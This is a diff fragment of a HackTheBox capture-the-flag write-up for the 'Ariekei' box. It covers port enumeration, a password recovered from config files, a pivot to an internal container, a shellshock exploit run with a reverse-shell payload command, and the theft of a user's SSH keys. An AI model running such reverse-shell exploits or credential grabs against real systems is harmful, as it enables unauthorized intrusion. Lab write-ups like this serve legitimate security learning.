@@ -11,7 +11,9 @@ categories: HackTheBox
 ![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled%201.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled%201.png)
 
 → Nginx on port 443 [ https ]
+
 → OpenSSH 7.2p2 ( Xenial ) port 22
+
 → OpenSSH 6.6.1p1 ( Trusty ) port 1022
 
 ## Enumerating HTTPS :
@@ -67,16 +69,19 @@ Exploit : [https://www.exploit-db.com/exploits/34900](https://www.exploit-db.com
 ## Pivoting to Beehive
 
 ⇒ In **commons/container** folder we find **blog-test** ( **Beehive** ) folder. Enumerating the config files we find :
+
 → Its running on **172.24.0.2**
 
 ![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled%209.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled%209.png)
 
 → We also found an password :
+
 Password : **Ib3!kTEvYw6*P7s**
 
 ![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled%2010.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled%2010.png)
 
 ⇒ We can use shellshock exploit now as we are on a different machine and WAF won't block it now.
+
 → Shellshock : [https://www.exploit-db.com/exploits/34900](https://www.exploit-db.com/exploits/34900)
 
 **python [enox.py](http://enox.py/) payload=reverse rhost=172.24.0.2 lhost=172.24.0.253 lport=4444 pages=/cgi-bin/stats**
@@ -84,6 +89,7 @@ Password : **Ib3!kTEvYw6*P7s**
 ![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled%2011.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled%2011.png)
 
 → We switched to root using the password we previously found.
+
 → We found spanishdancer user ssh keys in that user home folder :
 
 ![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled%2012.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled%2012.png)
